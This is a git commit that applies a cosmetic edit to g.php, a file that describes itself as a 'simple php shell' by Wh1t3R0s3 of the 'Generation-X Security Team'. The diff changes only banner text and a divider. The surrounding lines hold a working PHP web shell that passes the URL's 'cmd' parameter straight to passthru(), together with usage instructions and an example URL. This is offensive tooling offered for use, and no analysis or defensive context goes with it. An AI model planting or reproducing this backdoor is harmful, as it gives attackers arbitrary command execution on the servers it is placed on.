3669f5cf9e5e73f7df5e9a54d581dcb32c6139d2
xwh1t3r0s3 <xwh1t3r0s3@users.noreply.github.com>
2016-10-24 00:42:52 +0900

    g.php got modified

--- g.php
+++ g.php
@@ -1,10 +1,12 @@
 	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,<br>
 <br>
 	to use it just add ?cmd=[command] at the end of the link.<br>
+
 	Example:<br>
 	https://example.com/g.php?cmd=ls <br>
-	(c) Wh1t3R0s3<br><br>
----------------------------------------------------------------------------
+
+	&copy; Wh1t3R0s3<br><br>
+------------------------------------------------------------------------------------------------------------------------------
 <br>
 <?php
 echo passthru($_GET['cmd']); _halt_compiler();
